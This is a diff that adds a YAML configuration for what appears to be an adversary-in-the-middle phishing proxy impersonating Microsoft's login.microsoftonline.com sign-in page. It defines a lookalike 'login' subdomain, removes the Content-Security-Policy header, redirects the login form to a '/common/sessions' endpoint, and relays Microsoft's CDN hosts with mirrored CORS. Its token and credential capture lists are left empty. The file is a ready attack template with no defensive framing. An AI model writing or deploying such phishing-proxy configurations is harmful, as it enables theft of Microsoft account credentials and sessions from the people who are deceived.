@@ -1,0 +1,23 @@
+name: "Microsoft-Login"
+author: "Vanta v5"
+min_ver: "5.0.0"
+proxy_hosts:
+  - subdomain: "login"
+    target: "login.microsoftonline.com"
+auth_urls: ["/common/oauth2/v2.0/authorize", "/common/login"]
+landing_path: ["/common/login"]
+auth_tokens: []
+credentials: []
+injections: []
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+path_rewrites:
+  - {pattern: "^/$", replace: "/common/login", methods: ["GET"]}
+cookie_rewrites: []
+blocklist:
+  - {pattern: "analytics|gtm|/static/", mimes: ["text/javascript"], max_kb: 512}
+form_actions:
+  - {selector: "form[action*=\"login\"]", action_to: "/common/sessions"}
+bridges:
+  - {prefix: "/_mscdn/", target_host: "aadcdn.msftauth.net", strip_prefix: true, cors: "mirror"}
+  - {prefix: "/_mscdn2/", target_host: "aadcdn.msauth.net", strip_prefix: true, cors: "mirror"}
